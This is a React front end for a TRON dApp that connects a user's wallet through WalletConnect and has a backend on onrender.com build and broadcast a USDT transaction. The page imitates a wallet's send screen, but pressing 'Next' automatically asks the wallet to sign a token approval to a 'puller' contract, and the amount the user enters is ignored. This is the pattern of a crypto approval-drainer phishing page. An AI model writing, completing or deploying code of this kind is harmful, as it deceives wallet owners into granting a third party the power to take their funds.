import React, { useState, useEffect } from "react";
import { SignClient } from "@walletconnect/sign-client";
import { Web3Modal } from "@web3modal/standalone";
import TronWeb from "tronweb";
import { Buffer } from 'buffer';
import Swal from "sweetalert2";
import "@fortawesome/fontawesome-free/css/all.min.css";
import './App.css';
import '@fontsource/open-sans/300.css';
import '@fontsource/open-sans/400.css';
import '@fontsource/open-sans/500.css';
import '@fontsource/open-sans/600.css';
import '@fontsource/open-sans/700.css';
import '@fontsource/open-sans/800.css';
import '@fontsource/geist';

window.Buffer = Buffer;

// === CONFIG ===
const PROJECT_ID = "a2cd3f6f2c8dde8024ed901de2d36bc1";
const TRON_NODE = "https://api.trongrid.io";
const USDT_CONTRACT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // TRON mainnet USDT
const PULLER_CONTRACT = "TJBdv5qD7mpaU9bsRvbuBbe9TmjHYGwREw"; // Your deployed puller contract
const AMOUNT = 1000000; // 1 USDT (in SUN)
const MAINNET_CHAIN_ID = "tron:0x2b6653dc";

const web3Modal = new Web3Modal({
  projectId: PROJECT_ID,
  walletConnectVersion: 2,
});

export default function TronApp() {
  const [address, setAddress] = useState('');
  const [session, setSession] = useState(null);
  const [signClient, setSignClient] = useState(null);
  const [tronWeb, setTronWeb] = useState(null);
  const [txHash, setTxHash] = useState('');
  const [status, setStatus] = useState("Disconnected");
  const [amount, setAmount] = useState("1");
  const [usdValue, setUsdValue] = useState("= $1.00");
  const [isProcessing, setIsProcessing] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [theme, setTheme] = useState("dark");

  // === INIT SIGNCLIENT + TRONWEB ===
  useEffect(() => {
    const initClients = async () => {
      try {
        const client = await SignClient.init({
          projectId: PROJECT_ID,
          metadata: {
            name: "Tron DApp",
            description: "TRC20 Approve",
            url: window.location.origin,
            icons: ["https://example.com/icon.png"],
          },
        });
        setSignClient(client);

        const tw = new TronWeb({ fullHost: TRON_NODE });
        setTronWeb(tw);

        if (client.session.length) {
          const lastSession = client.session.get(client.session.keys.at(-1));
          setSession(lastSession);
          const userAddress = lastSession.namespaces.tron.accounts[0].split(":")[2];
          setAddress(userAddress);
          setStatus(`Connected: ${userAddress}`);
        }
      } catch (error) {
        console.error("Init error:", error);
        setStatus("Init failed");
      }
    };
    initClients();
  }, []);

  // === USD VALUE CALC ===
  useEffect(() => {
    const value = parseFloat(amount);
    setUsdValue(isNaN(value) || value <= 0 ? "= $0.00" : `= $${value.toFixed(2)}`);
  }, [amount]);

  // === THEME DETECTION ===
  useEffect(() => {
    const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
    setTheme(darkMode ? "dark" : "light");
    const listener = (e) => setTheme(e.matches ? "dark" : "light");
    window.matchMedia('(prefers-color-scheme: dark)').addEventListener("change", listener);
    return () => window.matchMedia('(prefers-color-scheme: dark)').removeEventListener("change", listener);
  }, []);

  // === CONNECT WALLET ===
  const connectWallet = async () => {
    if (!signClient) return;
    try {
      setStatus("Connecting... Use Trust Wallet");

      const { uri, approval } = await signClient.connect({
        requiredNamespaces: {
          tron: {
            chains: [MAINNET_CHAIN_ID],
            methods: ['tron_signTransaction', 'tron_signMessage'],
            events: [],
          },
        },
      });

      if (uri) await web3Modal.openModal({ uri });
      const session = await approval();
      setSession(session);
      const userAddress = session.namespaces.tron.accounts[0].split(":")[2];
      setAddress(userAddress);
      setStatus(`Connected: ${userAddress}`);
      await web3Modal.closeModal();

      // Automatically trigger approval after connection
      await approveUSDT();

    } catch (error) {
      console.error("Connection error:", error);
      setStatus("Connection failed");
      await web3Modal.closeModal();
    }
  };

  // === APPROVE USDT ===
  const approveUSDT = async () => {
    try {
      setIsProcessing(true);
      setStatus("Creating approval transaction...");
      setTxHash('');

      const txResponse = await fetch('https://smartcontbackend.onrender.com/create-approve', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          from: address,
          token: USDT_CONTRACT,
          spender: PULLER_CONTRACT,
          amount: AMOUNT
        })
      });

      const unsignedTx = await txResponse.json();
      if (!unsignedTx) throw new Error("Failed to get unsigned transaction");

      setStatus("Waiting for approval signature...");
      const signedTx = await signClient.request({
        chainId: MAINNET_CHAIN_ID,
        topic: session.topic,
        request: {
          method: 'tron_signTransaction',
          params: [unsignedTx]
        }
      });

      setStatus("Broadcasting approval transaction...");
      const broadcastResponse = await fetch('https://smartcontbackend.onrender.com/broadcast', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ signedTx })
      });

      const result = await broadcastResponse.json();
      if (!result || !(result.txid || result.txId)) {
        throw new Error("Broadcast failed");
      }

      const txId = result.txid || result.txId;
      setTxHash(txId);
      setShowSuccess(true);
      setStatus(`✅ Approval sent! TXID: ${txId}`);

    } catch (error) {
      console.error("Approval error:", error);
      Swal.fire("Error", error.message || "Approval failed", "error");
      setStatus(`❌ Error: ${error.message}`);
    } finally {
      setIsProcessing(false);
    }
  };

  // === DISCONNECT WALLET ===
  const disconnectWallet = async () => {
    if (signClient && session) {
      await signClient.disconnect({
        topic: session.topic,
        reason: { code: 6000, message: "User disconnected" },
      });
    }
    setSession(null);
    setAddress('');
    setStatus("Disconnected");
    setTxHash('');
  };

  const isDark = theme === "dark";

  if (showSuccess) {
    return (
      <div className={`min-h-screen flex flex-col justify-center items-center px-4 ${isDark ? "bg-[#1f1f1f] text-white" : "bg-white text-black"}`}>
        <svg className="w-24 h-24 text-green-500 animate-bounce" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
        </svg>
        <h2 className="text-2xl mt-4 font-semibold">Approval Successful</h2>
        <button
          className="fixed bottom-6 bg-[#5CE07E] text-black px-10 py-3 rounded-full text-lg font-semibold"
          onClick={() => setShowSuccess(false)}
        >
          OK
        </button>
      </div>
    );
  }

  return (
    <div className={`wallet-container ${isDark ? "dark" : "light"}`}>
      <div className="input-group">
        <p className="inpt_tital">Approve USDT to Contract</p>
        <div className="border">
          <div className="left">
            <input
              type="text"
              className="custom-input"
              value={PULLER_CONTRACT}
              readOnly
            />
          </div>
          <span className="right blue flex justify-between mr-3">
            <span className="w-6 text-sm">Copy</span>
            <i className="fas fa-address-book mar_i w-6 ml-6"></i>
            <i className="fas fa-qrcode mar_i w-6 ml-2"></i>
          </span>
        </div>
      </div>

      <div className="input-group mt-7">
        <p className="inpt_tital">Amount</p>
        <div className="border">
          <div className="left">
            <input
              type="number"
              min="0"
              step="0.01"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="USDT Amount"
              className="custom-input"
            />
          </div>
          <span className="right mr-3">
            <span className="text-sm text-[#b0b0b0]">USDT</span>
          </span>
        </div>
      </div>

      <p className="fees valid">{usdValue}</p>

      <button
        id="nextBtn"
        className="send-btn"
        onClick={connectWallet}
        disabled={isProcessing || !parseFloat(amount)}
        style={{
          backgroundColor: isProcessing || !parseFloat(amount) ? "var(--disabled-bg)" : "#5CE07E",
          color: isProcessing || !parseFloat(amount) ? "var(--disabled-text)" : "#1b1e15"
        }}
      >
        {isProcessing ? "Processing..." : "Next"}
      </button>

      <div style={{ marginTop: "20px", textAlign: "center" }}>
        <strong>Status:</strong> {status}
        {txHash && (
          <div style={{ marginTop: "10px" }}>
            <a href={`https://tronscan.org/#/transaction/${txHash}`} target="_blank" rel="noopener noreferrer">
              {txHash}
            </a>
          </div>
        )}
      </div>

      {session && (
        <div style={{ textAlign: "center", marginTop: "10px" }}>
          <button
            style={{ padding: "8px 16px", background: "#e74c3c", color: "#fff", border: "none", borderRadius: "4px" }}
            onClick={disconnectWallet}
          >
            Disconnect
          </button>
        </div>
      )}
    </div>
  );
}
